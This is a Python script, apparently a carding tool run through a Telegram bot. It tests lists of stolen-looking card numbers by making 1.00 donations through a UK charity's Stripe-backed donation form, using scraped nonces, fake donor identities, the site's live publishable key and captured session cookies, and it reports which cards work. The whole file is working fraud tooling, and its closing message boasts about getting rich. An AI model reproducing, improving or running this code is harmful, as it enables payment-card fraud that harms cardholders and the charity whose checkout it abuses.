import requests as rq
import time
import names
import random
from bs4 import BeautifulSoup

# SALVE DE EMERGENCIA #####################
def save(mensaje=None):
    with open('salve.txt', 'w') as file:
        file.write(mensaje)

# DIVISOR DE PARTES ############################
def dividir_mensaje(mensaje, limite=4096):
    """Divide un mensaje en partes que no superen el límite especificado."""
    partes = []
    
    # Mientras el mensaje tenga longitud
    while len(mensaje) > limite:
        # Encuentra el último espacio dentro del límite
        punto_corte = mensaje.rfind(" ", 0, limite)
        if punto_corte == -1:  # Si no hay espacio, corta en el límite
            punto_corte = limite
        
        # Corta el mensaje y lo agrega a la lista de partes
        partes.append(mensaje[:punto_corte])
        mensaje = mensaje[punto_corte:].strip()  # Elimina el espacio cortado y continúa

    # Agrega la última parte si queda mensaje
    if mensaje:
        partes.append(mensaje)
    
    return partes

# BARRA PROGRESIVA #########################
def progreso(chat_id, message_id, index, total, tarjeta, bot):
    progreso = int((index / total) * 100)
    barra = '█' * (progreso // 2) + '-' * (50 - progreso // 2)  # 50 caracteres en la barra
    mensaje = f"🔄 Verificando tarjeta {index + 1}/{total}:\n[{barra}] {progreso}%\nTarjeta: {tarjeta}"
    
    # Editar el mensaje en Telegram
    bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=mensaje)

def chk(chat_id, bot):
    # SALIDAS ##############################
    mensaje = []
    
    # DATOS FAKES ##########################
    nombre = names.get_first_name()
    apellido = names.get_last_name()
    email = f"{nombre.lower()}.{apellido.lower()}{random.randint(1, 999)}@gmail.com"

    # CODIGO ###############################

    s = rq.Session()
    UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'

    # OBTENCION DE SECRET KEYS ########################
    home = s.get('https://www.phauk.org/get-involved-with-the-pha-uk/make-a-donation/', headers={'User-Agent': UA})
    soup = BeautifulSoup(home.text, 'html.parser')
    form_id = soup.find('input', {'name': 'charitable_form_id'})['value']
    nonce = soup.find('input', {'name': '_charitable_donation_nonce'})['value']
    camp_id = soup.find('input', {'name': 'campaign_id'})['value']

    # SOLICITUDES DE PAGO #############################

    Payment_method = s.post('https://m.stripe.com/6', headers={'User-Agent': UA})
    pm_json = Payment_method.json()
    Guid = pm_json['guid']
    Muid = pm_json['muid']
    Sid = pm_json['sid']

    with open("tarjetas.txt", "r") as file:
        tarjetas = file.readlines()
        total_cards = len(tarjetas)
        msg = bot.send_message(chat_id, "Ha iniciado la verificación")
        message_id = msg.message_id
        for index, line in enumerate(tarjetas):
            # Separar los valores por coma
            card, mm, yy, cvc = line.strip().split('|')
            CARD_FORMAT = f"{card}|{mm}|{yy}|{cvc}"
            

            payload = {
                'type': 'card',
                'billing_details[name]': nombre + apellido,
                'billing_details[email]': email,
                'billing_details[address][country]': 'US',
                'billing_details[address][line1]': 'street 2',
                'billing_details[address][postal_code]': '10080',
                'card[number]': card,
                'card[cvc]': cvc,
                'card[exp_month]': mm,
                'card[exp_year]': yy,
                'guid': Guid,
                'muid': Muid,
                'sid': Sid,
                'payment_user_agent': 'stripe.js/ab4f93f420; stripe-js-v3/ab4f93f420; card-element',
                'referrer': 'https://www.phauk.org',
                'time_on_page': '99076',
                'key': 'pk_live_51Hrmn8Is1o0RpLyk1dHY3s00HJMB7ueMBo0rsL7QXxCjImq58quGRNTJNrQTKB54ekMeLnRmQWiefHIFBQ0bRklZ00983ZpRsK'
                }

            payment_headers = {
                "accept": "application/json",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
                "content-type": "application/x-www-form-urlencoded",
                "user-agent": UA
                }

            time.sleep(1.5)
            payment = s.post('https://api.stripe.com/v1/payment_methods', data=payload, headers=payment_headers)
            payment_json = payment.json()
            Id = payment_json['id']

            pre_payload = {
                'charitable_form_id': form_id,
                form_id: '',
                '_charitable_donation_nonce': nonce,
                '_wp_http_referer': '/get-involved-with-the-pha-uk/make-a-donation/',
                'campaign_id': camp_id,
                'description': 'Single Donation',
                'ID': '0',
                'donation_amount': 'custom',
                'custom_donation_amount': '1.00',
                'title': 'Mr',
                'first_name': nombre,
                'last_name': apellido,
                'email': email,
                'address': 'street 2',
                'address_2': '',
                'address_3': '',
                'city': '',
                'state': '',
                'postcode': '10080',
                'country': 'US',
                'phone': '',
                'gateway': 'stripe',
                'stripe_payment_method': Id,
                'action': 'make_donation',
                'form_action': 'make_donation'
                }

            pre_headers = {
                "accept": "application/json, text/javascript, */*; q=0.01",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "cookie": "cookieyes-consent=consentid:dmcwOUhyT0Q2b1NmOUR3dXhCVmxvNkxKekM3cDZuVFI,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes; _gid=GA1.2.492973426.1732825775; mailchimp_landing_site=https%3A%2F%2Fwww.phauk.org%2Fapp%2Fplugins%2Fcaptivatesync-trade%2Fassets%2Fcss%2Fdist%2Fshortcode-min.css%3Fver%3D3.0.0; charitable_session=03e305ba8606df38f85147c42ee54c40||86400||82800; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-29%2015%3A27%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.phauk.org%2Fget-involved-with-the-pha-uk%2Fmake-a-donation%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.phauk.org%2Fget-involved-with-the-pha-uk%2Fmake-a-donation%2F; sbjs_first_add=fd%3D2024-11-29%2015%3A27%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.phauk.org%2Fget-involved-with-the-pha-uk%2Fmake-a-donation%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.phauk.org%2Fget-involved-with-the-pha-uk%2Fmake-a-donation%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Safari%2F537.36%20Edg%2F130.0.0.0; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.phauk.org%2Fget-involved-with-the-pha-uk%2Fmake-a-donation%2F; _clck=ccl5uk%7C2%7Cfra%7C0%7C1794; _gat_gtag_UA_77924685_1=1; _ga_68GR7LPSNL=GS1.1.1732894055.2.1.1732894065.0.0.0; _ga=GA1.1.1252916187.1732825755; _clsk=j117dx%7C1732894070657%7C1%7C1%7Cz.clarity.ms%2Fcollect; _ga_HBS967BSQ4=GS1.1.1732894055.2.1.1732894090.0.0.0",
                "origin": "https://www.phauk.org",
                "referer": "https://www.phauk.org/get-involved-with-the-pha-uk/make-a-donation/",
                "user-agent": UA
                }
            time.sleep(1)
            pre = s.post('https://www.phauk.org/wp/wp-admin/admin-ajax.php', data=pre_payload, headers=pre_headers)
            pre_json = pre.json()
            #print(pre.status_code)
            #print(pre_json)

            if 'secret' in pre_json:
                ID = pre_json['secret']
                iD = pre_json['secret'][:27]

                done_payload = {
                'expected_payment_method_type': 'card',
                'use_stripe_sdk': 'true',
                'key': 'pk_live_51Hrmn8Is1o0RpLyk1dHY3s00HJMB7ueMBo0rsL7QXxCjImq58quGRNTJNrQTKB54ekMeLnRmQWiefHIFBQ0bRklZ00983ZpRsK',
                'client_secret': ID
                }

                done_headers = {
                    "accept": "application/json",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": "https://js.stripe.com",
                    "referer": "https://js.stripe.com/",
                    "user-agent": UA
                    }
                time.sleep(0.5)
                done = s.post(f"https://api.stripe.com/v1/payment_intents/{iD}/confirm", data=done_payload, headers=done_headers)
                try:
                    code = done.json()
                    msg = str(code['error']['message'])
                    # Formatear el mensaje y agregarlo a la lista
                    mensaje_formateado = f"""
                        {card}|{mm}|{yy}|{cvc}
                    ---------{msg}---------
                    """
                    mensaje.append(mensaje_formateado.strip())
                except KeyError:
                    msg = str(code['status'])
                    msg = f"{msg} [3DSECURE]"
                    # Formatear el mensaje y agregarlo a la lista
                    mensaje_formateado = f"""
                        {card}|{mm}|{yy}|{cvc}
                    ---------{msg}---------
                    """
                    mensaje.append(mensaje_formateado.strip())
                            
            else:
                msg = str(pre_json['errors'])
                # Formatear el mensaje y agregarlo a la lista
                mensaje_formateado = f"""
                    {card}|{mm}|{yy}|{cvc}
                ---------{msg}---------
                """
                mensaje.append(mensaje_formateado.strip())
 
            progreso(chat_id, message_id, index, total_cards, CARD_FORMAT, bot)
            save(mensaje_formateado)
        if len(mensaje) > 4096:
            
            if all("Your Card Was Declined" in m for m in mensaje):
                # Vaciar la lista mensaje
                mensaje.clear()

                # Enviar un mensaje personalizado al usuario
                mensaje_personalizado = "PP todas fueron declinadas. Pero no importa sigamos intentando que imposible no es. Nos vamos a forrar."
                bot.send_message(chat_id, mensaje_personalizado)  # Aquí puedes enviar el mensaje al usuario como desees
            else:
                # Dividir el mensaje si es necesario
                mensajes_divididos = dividir_mensaje(mensaje_largo)

                # Enviar cada parte del mensaje al bot
                for parte in mensajes_divididos:
                    bot.send_message(chat_id, parte)
        else:
            # Verificar si todos los mensajes contienen "Your Card Was Declined"
            if all("Your Card Was Declined" in m for m in mensaje):
                # Vaciar la lista mensaje
                mensaje.clear()

                # Enviar un mensaje personalizado al usuario
                mensaje_personalizado = "PP todas fueron declinadas. Pero no importa sigamos intentando que imposible no es. Nos vamos a forrar."
                bot.send_message(chat_id, mensaje_personalizado)  # Aquí puedes enviar el mensaje al usuario como desees
            else:
                for mensaje in mensaje:
                    bot.send_message(chat_id, mensaje)
